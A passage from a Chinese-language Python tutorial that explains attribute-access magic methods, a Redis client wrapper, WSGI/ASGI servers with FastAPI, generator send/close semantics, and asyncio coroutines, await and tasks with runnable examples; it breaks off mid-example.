<blockquote>
<p>此方法在一个属性被尝试赋值时被调用。这个调用会取代正常机制（即将值保存到实例字典）。 <em>name</em> 为属性名称， <em>value</em> 为要赋给属性的值。</p>
<p>如果 <code>__setattr__()</code> 想要赋值给一个实例属性，它应该调用同名的基类方法，例如 <code>object.__setattr__(self, name, value)</code></p>
</blockquote>
<p>在社区的一些编写过程中, 我们通常可能使用<code>super().__setattr__(name, value)</code>这种方式替代我们的object...的形式, 因为我们的类可能是存在多层继承的关系嘛.</p>
<p>而该special method更多的是用于拦截我们的赋值行为, 从而实现一些委托代理的味道.</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, desc</span>):
        self.desc = desc
        self.counter = <span class="hljs-number">0</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattribute__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-keyword">pass</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setattr__</span>(<span class="hljs-params">self, name, value</span>):
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"__setattr__"</span>)
        <span class="hljs-comment"># 完成赋值行为的默认定义. 实现具体的赋值功能</span>
        <span class="hljs-built_in">super</span>().__setattr__(name, value)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    a = A(<span class="hljs-string">"alice"</span>)
    a.desc = <span class="hljs-string">"hello, world!"</span>
    <span class="hljs-built_in">print</span>(a.desc)
    <span class="hljs-built_in">print</span>(a.name)  <span class="hljs-comment"># error </span>
</code></pre>
<p>因为<code>__setattr__</code>可以拦截赋值操作, 所以有时候我们可以做一些神奇的东西. 例如</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
    _attr = {}

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        self.data = <span class="hljs-string">"alice"</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, name</span>):
        <span class="hljs-keyword">if</span> name <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> self._attr:
            <span class="hljs-keyword">raise</span> AttributeError
        <span class="hljs-comment"># Note: call __getattribute__</span>
        <span class="hljs-keyword">return</span> self._attr[name]

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__setattr__</span>(<span class="hljs-params">self, name, value</span>):
        self._attr[name] = value


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    o1 = A()
    o2 = A()
    o1.data = <span class="hljs-string">"Bob"</span>
    <span class="hljs-built_in">print</span>(o2.data)  <span class="hljs-comment"># Bob</span>
</code></pre>
<p>我们的<code>_attr</code>属性是属于A这个class的. 他没有和self关联, 这意味着所有基于A Class创建的object都拥有这个<code>_attr</code>属性</p>
<p>而我们对每个object的属性赋值, 最终都会挂载到我们的<code>_attr</code>上. 是不是很神奇.</p>
<p>还有在<code>__getattr__</code>中调用的<code>self._attr[name]</code> 会调用系统提供的 <code>__getattribute__</code> 从而不会出现递归调用</p>
<ul>
<li><code>__delattr__</code></li>
</ul>
<p>在一个对象正常的产生和消亡, 并不会调用该方法</p>
<p>他是在我们尝试删除一个object属性, 它才会调用</p>
<p>getattr 这个 special method 会经常用于我们封装一些 wrapper 的方法，例如 Dify 在设计它们的 Redis 客户端的时候，考虑到 python 模块加载的特殊性，所以使用 Wrapper 包裹具体的 redis 客户端，具体实现为：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">if</span> TYPE_CHECKING:
    <span class="hljs-keyword">from</span> redis.lock <span class="hljs-keyword">import</span> Lock

logger = logging.getLogger(__name__)


<span class="hljs-keyword">class</span> <span class="hljs-title class_">RedisClientWrapper</span>:
    <span class="hljs-string">"""
    A wrapper class for the Redis client that addresses the issue where the global
    `redis_client` variable cannot be updated when a new Redis instance is returned
    by Sentinel.

    This class allows for deferred initialization of the Redis client, enabling the
    client to be re-initialized with a new instance when necessary. This is particularly
    useful in scenarios where the Redis instance may change dynamically, such as during
    a failover in a Sentinel-managed Redis setup.

    Attributes:
        _client: The actual Redis client instance. It remains None until
                 initialized with the `initialize` method.

    Methods:
        initialize(client): Initializes the Redis client if it hasn't been initialized already.
        __getattr__(item): Delegates attribute access to the Redis client, raising an error
                           if the client is not initialized.
    """</span>

    _client: <span class="hljs-type">Union</span>[redis.Redis, RedisCluster, <span class="hljs-literal">None</span>]

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-literal">None</span>:
        self._client = <span class="hljs-literal">None</span>

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">initialize</span>(<span class="hljs-params">self, client: <span class="hljs-type">Union</span>[redis.Redis, RedisCluster]</span>) -&gt; <span class="hljs-literal">None</span>:
        <span class="hljs-keyword">if</span> self._client <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            self._client = client

    <span class="hljs-keyword">if</span> TYPE_CHECKING:
        <span class="hljs-comment"># Type hints for IDE support and static analysis</span>
        <span class="hljs-comment"># These are not executed at runtime but provide type information</span>
        <span class="hljs-keyword">def</span> <span class="hljs-title function_">get</span>(<span class="hljs-params">self, name: <span class="hljs-built_in">str</span> | <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-type">Any</span>: ...

        ...

    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__getattr__</span>(<span class="hljs-params">self, item: <span class="hljs-built_in">str</span></span>) -&gt; <span class="hljs-type">Any</span>:
        <span class="hljs-keyword">if</span> self._client <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:
            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">"Redis client is not initialized. Call init_app first."</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-built_in">getattr</span>(self._client, item)


redis_client: RedisClientWrapper = RedisClientWrapper()


...
</code></pre>
<h2 data-id="heading-40">WSGI &amp; ASGI</h2>
<p>一个Web应用的本质就是：</p>
<ul>
<li>浏览器发送一个HTTP请求；</li>
<li>服务器收到请求，生成一个HTML文档；</li>
<li>服务器把HTML文档作为HTTP响应的Body发送给浏览器；</li>
<li>浏览器收到HTTP响应，从HTTP Body取出HTML文档并显示。</li>
</ul>
<p>而常规的web服务器会帮我实现好一些基础的操作，例如<br/>
接受HTTP请求、解析HTTP请求、发送HTTP响应</p>
<p>当然我们可以自己写，但是这些内容并不容易。我们需要对TCP, HTTP，HTTPS 等规范有着深刻的理解</p>
<p>大部分应用会将这些封装好，对我们上层开发者提供对应的接口，从而方便我们编写对应的web业务。<br/>
但不同的服务器可能会提供不同的接口，这里语言的设计团队一般会提供一套设计好的接口，从而使得每个<br/>
web服务提供的上层接口是一致的。</p>
<p>python中web接口有：</p>
<ul>
<li>WSGI：Web Server Gateway Interface：PEP 3333（2003年提出，用于同步）</li>
<li>ASGI：Asynchronous Server Gateway Interface：由 Django Channels 团队发起，现已成为异步 Python Web 的事实标准</li>
</ul>
<p>这样web服务器开发和web框架的开发就是分离，例如 FastAPI 是一个web框架，它基于ASGI实现，而ASGI对应的服务器有uvicorn, Daphne， Hypercorn<br/>
或许未来有更高效的ASGI服务器，那fastAPI也可以无缝衔接。<br/>
测试一下：</p>
<pre><code class="hljs language-shell" lang="shell">pip install fastapi
pip install hypercorn
pip install uvicorn
</code></pre>
<p>示例代码</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> fastapi <span class="hljs-keyword">import</span> FastAPI
<span class="hljs-comment"># hypercorn的启动</span>
<span class="hljs-keyword">from</span> hypercorn.config <span class="hljs-keyword">import</span> Config
<span class="hljs-keyword">from</span> hypercorn.asyncio <span class="hljs-keyword">import</span> serve
<span class="hljs-keyword">import</span> asyncio

app = FastAPI()


<span class="hljs-meta">@app.get(<span class="hljs-params"><span class="hljs-string">"/hello"</span></span>)</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hello</span>():
    <span class="hljs-keyword">return</span> {
        <span class="hljs-string">"desc"</span>: <span class="hljs-string">"hello, world"</span>
    }


<span class="hljs-comment"># 方式 1：使用 asyncio + serve（推荐）</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    config = Config()
    config.bind = [<span class="hljs-string">"0.0.0.0:8000"</span>]
    config.workers = <span class="hljs-number">1</span>  <span class="hljs-comment"># 注意：asyncio serve 本身是单进程，workers 在这里无效</span>
    <span class="hljs-comment"># 这里可能会有警告，因为starlette和hypercorn的类型声明不完全一致，但符合ASGI要去</span>
    <span class="hljs-comment"># ASGI https://asgi.readthedocs.io/en/latest/specs/main.html#applications</span>
    <span class="hljs-comment"># receive: an awaitable callable that will yield a new event dictionary when one is available</span>
    <span class="hljs-comment"># receive：调用一次 receive()，await 一次，得到一个事件字典</span>
    <span class="hljs-comment"># 只要定义如下的 类型 声明就可以了</span>
    <span class="hljs-comment"># from typing import Callable, Awaitable, Dict, Any</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># Receive = Callable[[], Awaitable[Dict[str, Any]]]</span>
    <span class="hljs-keyword">await</span> serve(app, config)


<span class="hljs-keyword">def</span> <span class="hljs-title function_">application</span>(<span class="hljs-params">environ, start_response</span>):
    <span class="hljs-string">"""

    :param environ：一个包含所有HTTP请求信息的dict对象；
    :param start_response：一个发送HTTP响应的函数。
    :return: 有了WSGI，我们关心的就是如何从environ这个dict对象拿到HTTP请求信息，然后构造HTML，通过start_response()发送Header，最后返回Body
    通过调用一些实现了WSGI的服务器，底层代码不需要我们自己编写，我们只负责在更高层次上考虑如何响应请求就可以了

    """</span>

    <span class="hljs-comment"># 从请求中获取一些信息，动态返回内容</span>
    path = environ[<span class="hljs-string">"PATH_INFO"</span>][<span class="hljs-number">1</span>:] <span class="hljs-keyword">or</span> <span class="hljs-string">"world"</span>

    <span class="hljs-comment"># 设置返回的响应头</span>
    start_response(<span class="hljs-string">'200 OK'</span>, [(<span class="hljs-string">'Content-Type'</span>, <span class="hljs-string">'text/html'</span>)])
    <span class="hljs-comment"># 设置返回的响应body</span>
    resp_body = <span class="hljs-string">f"&lt;h1&gt;Hello, <span class="hljs-subst">{path}</span>&lt;/h1&gt;"</span>
    <span class="hljs-keyword">return</span> [resp_body.encode()]


<span class="hljs-keyword">def</span> <span class="hljs-title function_">wsgiServer</span>():
    <span class="hljs-comment"># 从wsgiref模块导入:</span>
    <span class="hljs-keyword">from</span> wsgiref.simple_server <span class="hljs-keyword">import</span> make_server

    <span class="hljs-comment"># 创建一个服务器，IP地址为空，端口是8000，处理函数是application:</span>
    httpd = make_server(<span class="hljs-string">''</span>, <span class="hljs-number">8000</span>, application)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">'Serving HTTP on port 8000...'</span>)
    <span class="hljs-comment"># 开始监听HTTP请求:</span>
    httpd.serve_forever()


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-comment"># import uvicorn</span>
    <span class="hljs-comment">#</span>
    <span class="hljs-comment"># uvicorn.run("WSGI_interface_learn:app")</span>

    <span class="hljs-comment"># hypercorn的启动</span>
    <span class="hljs-comment"># asyncio.run(main())</span>

    <span class="hljs-comment"># 官方的wsgiref 的启动，该服务器是python官方基于WSGI接口实现的一个简易的服务器</span>
    wsgiServer()
</code></pre>
<p>这里因为 FastAPI 是基于 ASGI 接口进行的开发，所以只要任何实现了该接口的服务器，都可以运行 FastAPI 的程序，上面的示例中，我们通过 uvicorn，以及hypercorn 进行了测试</p>
<h2 data-id="heading-41">Coroutine</h2>
<p>为了简化讲解，我们这里将忽略内核线程，用户线程等专业的概念</p>
<p>协程是在一个线程中执行</p>
<p>最大的优势就是协程极高的执行效率。因为子程序切换不是线程切换，而是由程序自身控制，</p>
<p>因此，没有线程切换的开销，和多线程比，线程数量越多，协程的性能优势就越明显</p>
<p>第二大优势就是不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突（竞态条件）</p>
<p>在协程中控制共享资源不加锁，只需要判断状态就好了，所以执行效率比多线程高很多</p>
<p>因为协程是一个线程执行，想要利用多核CPU。最简单的方法是多进程+协程，因为 python 存在 GIL 的存在，所以我们这里需要多进程。从而充分利用多核，又充分发挥协程的高效率，可获得极高的性能</p>
<p>Python对协程的支持是通过 generator 实现的。也就是生成器，而生成器的语法核心在yield, 所以我们需要先了解 yield, yield form是什么</p>
<p>所以我们先学习 Generator 的内容，不过 generator 依赖我们以前学习的 iterator</p>
<p>从 该 pep 开始 <a href="https://link.juejin.cn?target=https%3A%2F%2Fpeps.python.org%2Fpep-0342%2F" target="_blank" title="https://peps.python.org/pep-0342/" ref="nofollow noopener noreferrer">peps.python.org/pep-0342/</a><br/>
将 yield 重新定义为表达式（expression），而不是语句（statement），但每当生成器通过正常的 next() 调用恢复时，yield 表达式的值都是 None</p>
<p>表达式相较于语句的好处就是，可以有返回值</p>
<ul>
<li>send: 为生成器迭代器添加一个新的 send() 方法，该方法恢复生成器并发送一个值，该值成为当前 yield-expression 的结果。</li>
<li>send()方法返回生成器产生的下一个值，或者如果生成器退出而没有产生另一个值，则引发 StopIteration</li>
</ul>
<p>**这里要注意的是：调用 send(None) 完全等同于调用生成器的 next() 方法, 其次 由于生成器迭代器在生成器函数体的顶部开始执行，  **</p>
<p>**因此当生成器刚刚创建时，没有 yield 表达式来接收值。因此，当生成器迭代器刚刚启动时，禁止使用非 None 参数调用 send()，   **</p>
<p>**如果发生这种情况，则会引发 TypeError（可能是由于某种逻辑错误）。  **</p>
<p><strong>因此，在与协程通信之前，必须先调用 next() 或 send(None) 将其执行推进到第一个 yield 表达式</strong></p>
<ul>
<li>close: 为生成器迭代器（generator-iterator）添加一个 close() 方法，该方法会在生成器上次暂停的位置抛出 GeneratorExit 异常。</li>
<li>如果生成器随后抛出 StopIteration（例如通过正常结束，或因已被关闭）或 GeneratorExit（例如未捕获该异常），则</li>
<li>close() 方法会正常返回给调用者。</li>
<li>如果生成器在处理 GeneratorExit 时又 yield 了一个值，则会引发 RuntimeError。</li>
<li>如果生成器抛出其他任何异常，该异常会向上传播给调用者。</li>
<li>如果生成器已经因异常或正常退出而结束，close() 方法将不执行任何操作。</li>
</ul>
<h3 data-id="heading-42">asyncio 快速入门</h3>
<h4 data-id="heading-43">基于 async 关键字创建 coroutine</h4>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">my_coroutine</span>() -&gt; <span class="hljs-literal">None</span>:
  <span class="hljs-built_in">print</span>(<span class="hljs-string">"Hello world!"</span>)
</code></pre>
<p>这个函数很简单, 仅仅是加上了一个 async 关键字.</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">coroutine_add_one</span>(<span class="hljs-params">number: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> number + <span class="hljs-number">1</span>


<span class="hljs-keyword">def</span> <span class="hljs-title function_">add_one</span>(<span class="hljs-params">number: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> number + <span class="hljs-number">1</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    function_result = add_one(<span class="hljs-number">1</span>)
    coroutine_result = coroutine_add_one(<span class="hljs-number">1</span>)

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"普通函数结果为: <span class="hljs-subst">{function_result}</span> 返回值的类型为: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(function_result)}</span>"</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"coroutine结果为: <span class="hljs-subst">{coroutine_result}</span> 返回值的类型为: <span class="hljs-subst">{<span class="hljs-built_in">type</span>(coroutine_result)}</span>"</span>)
普通函数结果为: <span class="hljs-number">2</span> 返回值的类型为: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'int'</span>&gt;
coroutine结果为: &lt;coroutine <span class="hljs-built_in">object</span> coroutine_add_one at <span class="hljs-number">0x000002915BA9E570</span>&gt; 返回值的类型为: &lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'coroutine'</span>&gt;
</code></pre>
<p><strong>当我们调用时coroutine函数时, 不会执行协程中的代码. 我们得到的是一个coroutine对象</strong>, 这个对象是可以稍后执行的, 如果希望运行一个 coroutine, 需要在事件循环上进行运行.</p>
<p>现在的问题是, 如何创建事件循环?</p>
<p>在python3.7之后, asyncio提供了几个方便的函数, 而其中有一个 <code>asyncio.run</code> 可以用来运行协程</p>
<ul>
<li>运行一个coroutine</li>
</ul>
<p>关于 asyncio.run: <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.python.org%2Fzh-cn%2F3.15%2Flibrary%2Fasyncio-runner.html%23asyncio.run" target="_blank" title="https://docs.python.org/zh-cn/3.15/library/asyncio-runner.html#asyncio.run" ref="nofollow noopener noreferrer">docs.python.org/zh-cn/3.15/…</a></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">coroutine_add_one</span>(<span class="hljs-params">number: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> number + <span class="hljs-number">1</span>


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-comment"># 这里是传递coroutine, 而不是函数对象</span>
    result = asyncio.run(coroutine_add_one(<span class="hljs-number">1</span>))

    <span class="hljs-built_in">print</span>(result)
</code></pre>
<p><code>asyncio.run</code>它创造了一个事件循环. 一旦它成功, 它就会接受传递给它的协程并运行它, 直到协程执行完成, 返回结果</p>
<p>可能最重要的是, 它旨在成为我们<strong>创建的 asyncio 应用程序的主要入口点</strong></p>
<p>它只执行一个协程, 并且该协程应该启动我们应用程序的所有其他方面.</p>
<p>在后面的内容中, 我们将渐渐使用此函数作为几乎所有应用程序的入口点. <code>asyncio.run</code>执行的协程将创建并运行其他协程, 这将使我们能够利用 asyncio 的并发性质</p>
<h4 data-id="heading-44">通过 await 关键字暂停执行</h4>
<p>asyncio 的真正好处是能够暂停执行, 让事件循环在执行一个尝试操作的时候, 运行其他任务</p>
<p>如果希望暂停, 可以通过 await 关键字, 该关键字后面跟着coroutin的调用(更具体地说, 是一个称为 <em>awaitable</em> 的对象, 它并不总是coroutine, 我们将在后面了解有关 awaitables 的更多信息)</p>
<p>使用await将导致其后面的协程被运行, 这与直接调用协程不同.</p>
<p>注意: 该<code>await awaitable</code>表达式, 还将暂停包含它的协程, 直到这个等待的协程完成并返回结果, 然后程序往下执行.</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">coroutine_add_one</span>(<span class="hljs-params">number: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> number + <span class="hljs-number">1</span>


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:
    one_plus_one = <span class="hljs-keyword">await</span> coroutine_add_one(<span class="hljs-number">1</span>)
    two_plus_one = <span class="hljs-keyword">await</span> coroutine_add_one(<span class="hljs-number">2</span>)

    <span class="hljs-built_in">print</span>(one_plus_one)
    <span class="hljs-built_in">print</span>(two_plus_one)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b62913ffea9a4f918f22c355cf55bebf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=K8x88bZA%2B89w5tw0JzPwMBaQ1OI%3D" alt="img" loading="lazy"/></p>
<p>这里main是父coroutine 函数, 而add_one这个是子coroutine 函数</p>
<p>我们暂停父协程并在 await 表达式中运行add_one协程, 完成后, 我们恢复父协程并获取返回值.</p>
<p>就目前而言, 此代码的作方式与普通顺序代码没有区别, await之后的程序也没有任何IO的行为.</p>
<p>用 viztracer（python一个可视化库） 可以看到这样的执行流程</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d1d3c12414d849de9ba144a3dec8b69b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=emqd62rIXtfN1v9ID9ArqXMs9ew%3D" alt="img" loading="lazy"/></p>
<p>不过在python3.14之后官方提供了查看异步任务的api了。</p>
<h4 data-id="heading-45">引入 基于 sleep 的长时运行的协程</h4>
<p><code>asyncio.sleep</code>可以"睡眠"制定的秒数, 这个函数也是一个 coroutine, 所以应该配合await 使用, 而不能直接调用. 从而模拟使用 一些 耗时 的 I / O 行为</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world_message</span>() -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">await</span> asyncio.sleep(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello World!"</span>


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:
    message = <span class="hljs-keyword">await</span> hello_world_message()
    <span class="hljs-built_in">print</span>(message)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ceabb198e454339af62d65c98c04108~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=Q32E8ZYAju1MTCV%2BAfjBY4PY6H0%3D" alt="img" loading="lazy"/></p>
<p>因为后续会经常使用 sleep, 所以我们尝试设置一个可复用的 delay协程</p>
<p>该文件位于 util 模块下.</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-string">"""
@file_name: delay_functions.py
@desc: 可复用的 delay 函数
"""</span>

<span class="hljs-keyword">import</span> asyncio


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">delay</span>(<span class="hljs-params">delay_second: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"睡眠 <span class="hljs-subst">{delay_second}</span> 秒"</span>)
    <span class="hljs-keyword">await</span> asyncio.sleep(delay_second)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"睡眠 <span class="hljs-subst">{delay_second}</span> 秒 已完成"</span>)
    <span class="hljs-keyword">return</span> delay_second
</code></pre>
<ul>
<li>多 await 程序</li>
</ul>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> delay


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">add_one</span>(<span class="hljs-params">number: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:
    <span class="hljs-keyword">return</span> number + <span class="hljs-number">1</span>


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">hello_world_message</span>() -&gt; <span class="hljs-built_in">str</span>:
    <span class="hljs-keyword">await</span> delay(<span class="hljs-number">1</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-string">"Hello World!"</span>


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>() -&gt; <span class="hljs-literal">None</span>:
    message = <span class="hljs-keyword">await</span> hello_world_message()
    one_plus_one = <span class="hljs-keyword">await</span> add_one(<span class="hljs-number">1</span>)
    <span class="hljs-built_in">print</span>(one_plus_one)
    <span class="hljs-built_in">print</span>(message)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
睡眠 <span class="hljs-number">1</span> 秒
睡眠 <span class="hljs-number">1</span> 秒 已完成
<span class="hljs-number">2</span>
Hello World!
</code></pre>
<p>当我们运行它时, 在打印两个函数调用的结果之前经过 1 秒. 我们真正想要的是 <code>add_one(1)</code>的值和 <code>hello_world_message()</code> 并发运行时立即打印. 那么为什么这段代码没有发生这种情况呢? 答案是 await 暂停我们当前的协程, 并且在表达式给我们一个值之前不会在该协程中执行任何其他代码</p>
<p>这种情况下, 我们的代码表现得好像它是顺序的</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8985ac98a78f42e68e42c66c7e8fc20d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=I3VNEilUVu%2FlsN3k5zJCZKDJ28Q%3D" alt="img" loading="lazy"/></p>
<p>为了实现 执行协程时, 不会阻碍后续程序的执行, 我们需要引入一个 Task 的概念.</p>
<h4 data-id="heading-46">基于 Tasks 进行并发运行</h4>
<p>Task是coroutine的包装器, 用于安排coroutine尽快在事件循环上运行. 这种调度和执行以<strong>非阻塞方式</strong>进行, 这意味着, 一旦我们创建了一个任务, 我们就可以在任务运行时立即执行其他代码</p>
<p>这与我们之前使用<code>await</code> 表达式存在显著的不同.</p>
<p>通过它, 我们可以同时执行多个任务. 也就是降低我们的I / O 的等待时间.</p>
<h5 data-id="heading-47">创建task</h5>
<p>我们需要通过 <code>asyncio.create_task</code> 创建Task.</p>
<p>该函数接受的参数类型为: <code>Generator[Any, None, _T] | Coroutine[Any, Any, _T]</code></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio

<span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> delay


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    sleep_for_three = asyncio.create_task(delay(<span class="hljs-number">3</span>))
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(sleep_for_three))
    result = <span class="hljs-keyword">await</span> sleep_for_three
    <span class="hljs-built_in">print</span>(result)


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'_asyncio.Task'</span>&gt;
睡眠 <span class="hljs-number">3</span> 秒
睡眠 <span class="hljs-number">3</span> 秒 已完成
<span class="hljs-number">3</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/91d525d49328442a8dcd10bcf02afbc1~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgc25vd3Nub3c=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770866616&amp;x-signature=jOygyGut2jDHz1gyA8%2B79jmKRng%3D" alt="img" loading="lazy"/></p>
<p>值的注意的是: 如果我们不使用 await 等待coroutine运行结束, 我们的Task将被安排运行, 但在关闭事件循环时, 它几乎会立即停止并“清理”</p>
<p>这个问题, 我们在后面会提供一些方式来处理.</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio

<span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> delay


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    sleep_for_three = asyncio.create_task(delay(<span class="hljs-number">3</span>))
    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(sleep_for_three))


<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:
    asyncio.run(main())
&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">'_asyncio.Task'</span>&gt;
睡眠 <span class="hljs-number">3</span> 秒
</code></pre>
<p>程序没有执行完毕.</p>
<h5 data-id="heading-48">并发运行多tasks</h5>
<p>并发运行多任务</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> asyncio
<span class="hljs-keyword">import</span> time

<span class="hljs-keyword">from</span> util <span class="hljs-keyword">import</span> delay


<span class="hljs-keyword">async</span> <span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():
    start = time.time()
    sleep_for_three = asyncio.create_task(delay(<span class="hljs-number">3</span>))
    sleep_again = asyncio.create_task(delay(<span class="hljs-number">3</span>))
    sleep_one_more_time = asyncio.create_task(delay(<span class="hljs-number">3</span>))

    <span class="hljs-keyword">await</span> sleep_for_three
    <span class="hljs-keyword">await</span> sleep_again
    <span class="hljs-keyword">await</span> sleep_one_more_time
    end = time.time()

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"执行耗时: <span class="hljs-subst">{end - start:<span class="hljs-number">.4</span>f}</span>"</span>)


